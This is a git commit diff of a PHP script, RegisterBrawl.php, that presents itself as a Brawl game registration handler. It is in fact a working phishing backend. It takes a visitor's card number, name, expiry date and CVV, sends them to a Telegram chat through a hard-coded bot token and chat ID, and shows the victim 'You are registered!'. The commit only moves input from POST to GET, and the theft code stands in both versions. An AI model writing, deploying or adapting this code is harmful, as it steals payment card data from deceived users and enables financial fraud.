6298b61a623cb34e5edde7c1f361839b162636af
Sugar Goose <130372150+Sugar-Goose@users.noreply.github.com>
2023-08-10 20:41:20 +0300

    Update RegisterBrawl.php

--- RegisterBrawl.php
+++ RegisterBrawl.php
@@ -1,27 +1,34 @@
 <?php
 
-$card_number = $_POST['user_number'];
-$name = $_POST['user_name'];
-$date = $_POST['user_date'];
-$cvv = $_POST['user_cvv']
-$token = "6537472202:AAE_z7dBAIr1hu0cgC1trxVG_IZCJhORs6Q";
-$chat_id = "-1001950408583";
-$arr = array(
-  'Номер карты: ' => $card_number,
-  'Имя: ' => $name,
-  'Дата: ' => $date,
-  'CVV: ' => $cvv
-);
-
-foreach($arr as $key => $value) {
-  $txt .= "<b>".$key."</b> ".$value."%0A";
-};
-
-$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
-
-if ($sendToTelegram) {
-  echo "You are registered!";
-} else {
-  echo "Error";
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    $card_number = $_GET['user_number'];
+    $name = $_GET['user_name'];
+    $date = $_GET['user_date'];
+    $cvv = $_GET['user_cvv'];
+    
+    $token = "6537472202:AAE_z7dBAIr1hu0cgC1trxVG_IZCJhORs6Q";
+    $chat_id = "-1001950408583";
+    
+    $arr = array(
+      'Номер карты: ' => $card_number,
+      'Имя: ' => $name,
+      'Дата: ' => $date,
+      'CVV: ' => $cvv
+    );
+    
+    $txt = '';
+    
+    foreach($arr as $key => $value) {
+      $txt .= "<b>".$key."</b> ".$value."%0A";
+    }
+    
+    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
+    
+    if ($sendToTelegram) {
+      echo "You are registered!";
+    } else {
+      echo "Error";
+    }
 }
+
 ?>
